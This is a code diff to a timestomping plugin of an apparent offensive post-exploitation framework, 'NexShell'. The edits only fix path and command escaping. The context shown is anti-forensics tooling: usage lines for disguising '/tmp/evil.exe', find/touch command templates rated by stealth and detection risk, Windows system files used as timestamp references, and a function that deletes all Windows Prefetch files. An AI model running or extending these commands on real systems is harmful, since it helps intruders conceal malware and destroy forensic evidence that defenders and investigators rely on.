@@ -30,7 +30,7 @@ MITRE ATT&CK:
 Usage:
     (NexShell)> plugins run timestomper --file /tmp/evil.exe --reference /bin/ls
     (NexShell)> plugins run timestomper --batch --pattern "*.exe" --dir /tmp
-    (NexShell)> plugins run timestomper --file C:\evil.exe --method powershell
+    (NexShell)> plugins run timestomper --file C:\\evil.exe --method powershell
     (NexShell)> plugins run timestomper --file /tmp/evil --timestamp "2024-01-01 12:00:00"
     (NexShell)> plugins run timestomper --file /tmp/evil --stealth --verify
     (NexShell)> plugins run timestomper --list-references
@@ -378,7 +378,7 @@ class TimestompMethodsDatabase:
             description='Timestomp all files in directory',
             platform='all',
             category='batch',
-            command_template='find {directory} -type f -exec touch -r {reference} {{}} \\\;',
+            command_template=r'find {directory} -type f -exec touch -r {reference} {{}} \;',
             success_rate=90,
             detection_risk='medium',
             stealth_level=3,
@@ -390,7 +390,7 @@ class TimestompMethodsDatabase:
             description='Timestomp files matching pattern',
             platform='all',
             category='batch',
-            command_template='find {directory} -name "{pattern}" -exec touch -r {reference} {{}} \\\;',
+            command_template=r'find {directory} -name "{pattern}" -exec touch -r {reference} {{}} \;',
             success_rate=90,
             detection_risk='medium',
             stealth_level=3,
@@ -425,26 +425,26 @@ class ReferenceFilesDatabase:
     
     # Windows reference files
     WINDOWS_REFS = [
-        ReferenceFile('C:\\\Windows\\\System32\\\cmd.exe', 'windows', 'system'),
-        ReferenceFile('C:\\\Windows\\\System32\\notepad.exe', 'windows', 'system'),
-        ReferenceFile('C:\\\Windows\\\System32\\\calc.exe', 'windows', 'system'),
-        ReferenceFile('C:\\\Windows\\\System32\\\svchost.exe', 'windows', 'system'),
-        ReferenceFile('C:\\\Windows\\\System32\\explorer.exe', 'windows', 'system'),
-        ReferenceFile('C:\\\Windows\\\System32\\\kernel32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\ntdll.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\user32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\advapi32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\shell32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\ole32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\gdi32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\wininet.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\ws2_32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\crypt32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\msvcrt.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\rpcrt4.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\secur32.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\\setupapi.dll', 'windows', 'library'),
-        ReferenceFile('C:\\\Windows\\\System32\\version.dll', 'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\cmd.exe',      'windows', 'system'),
+        ReferenceFile(r'C:\Windows\System32\notepad.exe',   'windows', 'system'),
+        ReferenceFile(r'C:\Windows\System32\calc.exe',      'windows', 'system'),
+        ReferenceFile(r'C:\Windows\System32\svchost.exe',   'windows', 'system'),
+        ReferenceFile(r'C:\Windows\System32\explorer.exe',  'windows', 'system'),
+        ReferenceFile(r'C:\Windows\System32\kernel32.dll',  'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\ntdll.dll',     'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\user32.dll',    'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\advapi32.dll',  'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\shell32.dll',   'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\ole32.dll',     'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\gdi32.dll',     'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\wininet.dll',   'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\ws2_32.dll',    'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\crypt32.dll',   'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\msvcrt.dll',    'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\rpcrt4.dll',    'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\secur32.dll',   'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\setupapi.dll',  'windows', 'library'),
+        ReferenceFile(r'C:\Windows\System32\version.dll',   'windows', 'library'),
     ]
     
     # Linux reference files
@@ -680,7 +680,7 @@ class AntiForensicsEngine:
     @staticmethod
     def clear_prefetch(exec_func, session) -> bool:
         """Clear prefetch files (Windows)."""
-        cmd = 'del /q C:\\\Windows\\\Prefetch\\\*.pf'
+        cmd = r'del /q C:\Windows\Prefetch\*.pf'
         out = exec_func(session, cmd)
         return out and 'error' not in out.lower()
     
